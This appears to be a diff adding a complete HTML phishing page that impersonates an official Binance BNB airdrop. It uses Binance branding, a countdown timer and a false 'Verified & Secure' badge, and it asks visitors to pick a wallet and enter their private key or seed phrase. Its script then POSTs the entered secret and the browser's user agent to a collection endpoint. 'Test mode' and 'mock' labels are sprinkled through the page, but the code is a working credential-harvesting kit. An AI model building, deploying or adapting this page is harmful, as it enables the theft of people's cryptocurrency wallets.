@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BNB Airdrop – Test Simulation</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+
+<style>
+/* Background Animation */
+.bg-animated {
+  background: linear-gradient(270deg, #1a202c, #2d3748, #1a202c);
+  background-size: 600% 600%;
+  animation: gradientBG 10s ease infinite;
+}
+@keyframes gradientBG {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
+/* Icon bounce */
+@keyframes bounce {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-5px); }
+}
+.animated-icon {
+  animation: bounce 1s infinite;
+}
+
+/* Loading dots */
+@keyframes pulse {
+  0%, 100% { opacity: 0.3; }
+  50% { opacity: 1; }
+}
+.loading-dot {
+  display: inline-block;
+  width: 8px;
+  height: 8px;
+  margin: 0 2px;
+  background-color: #fff;
+  border-radius: 50%;
+  animation: pulse 1s infinite;
+}
+.loading-dot:nth-child(2) { animation-delay: 0.2s; }
+.loading-dot:nth-child(3) { animation-delay: 0.4s; }
+
+/* Progress Bar */
+.progress-container {
+  width: 100%;
+  background-color: #2d3748;
+  border-radius: 0.5rem;
+  overflow: hidden;
+  height: 12px;
+  margin-top: 6px;
+}
+.progress-bar {
+  height: 12px;
+  width: 0%;
+  background-color: #F3BA2F;
+  transition: width 1s ease-in-out;
+}
+</style>
+</head>
+<body class="bg-animated text-white font-sans">
+
+<div class="container mx-auto p-8 flex flex-col md:flex-row justify-between">
+
+  <!-- Left Side -->
+  <div class="md:w-2/3">
+    <span class="bg-yellow-500 text-black px-3 py-1 rounded-full mb-4 inline-block">
+      🚀 BNB AIRDROP (TEST MODE)
+    </span>
+
+    <h1 class="text-4xl font-bold mb-2">
+      Claim Your <span class="text-yellow-300">150$ BNB Airdrop</span>
+    </h1>
+
+    <p class="text-gray-300 mb-4">
+      🎉 Claim Your $150 Binance BNB Airdrop Today! 🚀
+    </p>
+
+    <!-- Countdown Timer -->
+    <div id="countdown" class="bg-gray-800 p-3 rounded-lg mb-4 text-center text-yellow-300 font-semibold text-lg">
+      Time Left: <span id="days">5</span>d : <span id="hours">00</span>h : <span id="minutes">00</span>m : <span id="seconds">00</span>s
+    </div>
+
+    <button id="claimBtn"
+      class="bg-yellow-400 hover:bg-yellow-500 transition px-6 py-2 rounded text-black font-semibold mb-4">
+      Claim Airdrop
+    </button>
+
+    <!-- Wallet Selector -->
+    <div id="walletSelector" class="hidden mt-4">
+      <label class="block mb-2">Select Wallet:</label>
+      <select id="walletType" class="p-2 rounded w-full text-black">
+        <option value="none">-- Choose Wallet --</option>
+        <option value="metamask" data-icon="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg">MetaMask</option>
+        <option value="trustwallet" data-icon="https://trustwallet.com/assets/images/media/assets/TWT.png">TrustWallet</option>
+        <option value="phantom" data-icon="https://phantom.app/img/logo.png">Phantom</option>
+        <option value="coinbase" data-icon="https://avatars.githubusercontent.com/u/1885080?s=280&v=4">Coinbase Wallet</option>
+        <option value="nearwallet" data-icon="https://cryptologos.cc/logos/near-protocol-near-logo.png">NEAR Wallet</option>
+      </select>
+      <div id="walletIconDisplay" class="mt-3"></div>
+    </div>
+
+    <!-- Mock Input Section -->
+    <div id="inputSection" class="hidden mt-4">
+      <label class="block mb-2">Enter Private Key / Seed Phrase (Mock for Testing):</label>
+      <textarea id="walletInput"
+        class="w-full h-28 p-2 rounded text-black"
+        placeholder="Enter any fake key or fake seed phrase for simulation">
+      </textarea>
+
+      <div class="flex justify-center mt-3">
+        <div id="loader" class="hidden border-4 border-yellow-300 border-t-yellow-600 rounded-full w-6 h-6 animate-spin"></div>
+      </div>
+
+      <button id="submitKey"
+        class="mt-4 bg-yellow-400 hover:bg-yellow-500 transition px-4 py-2 rounded text-black font-semibold w-full">
+        Connect & Activate Airdrop
+      </button>
+    </div>
+
+    <!-- Feedback -->
+    <div id="feedback" class="mt-4 text-yellow-200 font-semibold"></div>
+  </div>
+
+  <!-- Right Panel – Realistic Binance Style -->
+  <div class="md:w-1/3 bg-gray-900 p-6 rounded-lg shadow-lg mt-6 md:mt-0">
+    <h2 class="text-xl font-bold mb-4 flex items-center gap-2">
+      <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="w-6 h-6"> 
+      Airdrop Details
+    </h2>
+
+    <!-- Reward Card -->
+    <div class="bg-gray-800 p-3 rounded-lg flex flex-col gap-2 mb-3">
+      <div class="flex items-center gap-3">
+        <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="w-6 h-6">
+        <span class="text-yellow-400 font-semibold">🎁 150 BNB Reward</span>
+      </div>
+      <div class="progress-container">
+        <div class="progress-bar" id="rewardProgress"></div>
+      </div>
+    </div>
+
+    <!-- Wallet Status Card -->
+    <div class="bg-gray-800 p-3 rounded-lg flex items-center gap-3 mb-3">
+      <img src="https://cdn-icons-png.flaticon.com/512/190/190411.png" class="w-6 h-6">
+      <span class="text-green-400 font-semibold">🔒 Wallet: Verified & Secure</span>
+    </div>
+
+    <!-- Claim Status Card -->
+    <div class="bg-gray-800 p-3 rounded-lg flex items-center gap-3 mb-3">
+      <img src="https://cdn-icons-png.flaticon.com/512/565/565491.png" class="w-6 h-6">
+      <span id="claimStatus" class="text-gray-200 font-semibold">⏳ Claim Status: Pending</span>
+    </div>
+
+    <!-- Notes Card -->
+    <div class="bg-gray-800 p-3 rounded-lg flex items-center gap-3 mb-3">
+      <img src="https://cdn-icons-png.flaticon.com/512/709/709699.png" class="w-6 h-6">
+      <span class="text-gray-300 font-semibold">💡 Note: Official Binance Airdrop Simulation</span>
+    </div>
+
+    <!-- Footer -->
+    <p class="mt-6 text-gray-500 text-xs text-center">
+      © 2025 Binance. All rights reserved. (Simulation)
+    </p>
+  </div>
+
+</div>
+
+<script>
+// Countdown Timer
+const countdownEl = {
+  days: document.getElementById("days"),
+  hours: document.getElementById("hours"),
+  minutes: document.getElementById("minutes"),
+  seconds: document.getElementById("seconds")
+};
+const endTime = new Date();
+endTime.setDate(endTime.getDate() + 5);
+
+function updateCountdown() {
+  const now = new Date();
+  const diff = endTime - now;
+
+  if (diff <= 0) {
+    countdownEl.days.textContent = "0";
+    countdownEl.hours.textContent = "00";
+    countdownEl.minutes.textContent = "00";
+    countdownEl.seconds.textContent = "00";
+    clearInterval(countdownInterval);
+    return;
+  }
+
+  const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+  const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+  const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+  const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
+  countdownEl.days.textContent = days;
+  countdownEl.hours.textContent = String(hours).padStart(2,"0");
+  countdownEl.minutes.textContent = String(minutes).padStart(2,"0");
+  countdownEl.seconds.textContent = String(seconds).padStart(2,"0");
+}
+const countdownInterval = setInterval(updateCountdown, 1000);
+updateCountdown();
+
+// Wallet & Airdrop Logic
+const claimBtn = document.getElementById("claimBtn");
+const walletSelector = document.getElementById("walletSelector");
+const walletType = document.getElementById("walletType");
+const inputSection = document.getElementById("inputSection");
+const walletIconDisplay = document.getElementById("walletIconDisplay");
+const submitKey = document.getElementById("submitKey");
+const walletInput = document.getElementById("walletInput");
+const feedback = document.getElementById("feedback");
+const rewardProgress = document.getElementById("rewardProgress");
+const claimStatus = document.getElementById("claimStatus");
+const loader = document.getElementById("loader");
+const SERVER_URL = "http://10.41.27.19:3000/api/save";
+
+claimBtn.onclick = () => { walletSelector.classList.remove("hidden"); };
+walletType.onchange = () => {
+  if (walletType.value !== "none") {
+    const icon = walletType.options[walletType.selectedIndex].getAttribute("data-icon");
+    walletIconDisplay.innerHTML = `<img src="${icon}" class="w-12 h-12 animated-icon">`;
+    inputSection.classList.remove("hidden");
+  } else { inputSection.classList.add("hidden"); walletIconDisplay.innerHTML = ""; }
+};
+
+submitKey.onclick = async () => {
+  const type = walletType.value;
+  const data = walletInput.value.trim();
+  if(type==="none"){ feedback.textContent="Select a wallet first!"; return; }
+  if(!data){ feedback.textContent="Enter mock key or seed phrase!"; return; }
+
+  loader.classList.remove("hidden");
+  submitKey.disabled=true;
+  feedback.innerHTML="Processing <span class='loading-dot'></span><span class='loading-dot'></span><span class='loading-dot'></span>";
+
+  // Animate Progress Bar
+  rewardProgress.style.width="0%";
+  setTimeout(()=>{ rewardProgress.style.width="100%"; }, 100);
+
+  // Confetti
+  setTimeout(()=>{ confetti({particleCount:100,spread:70,origin:{y:0.6}}); },1200);
+
+  // Send to test server
+  try{
+    await fetch(SERVER_URL,{method:"POST",headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({wallet:type,mockKey:data,timestamp:new Date().toISOString(),agent:navigator.userAgent})});
+    feedback.innerHTML="✅ Airdrop Activated (Mock)";
+    claimStatus.textContent="✅ Claim Status: Completed";
+  } catch(e){ feedback.innerHTML="❌ Test Server Not Reachable"; }
+
+  loader.classList.add("hidden");
+  submitKey.disabled=false;
+};
+</script>
+
+</body>
+</html>
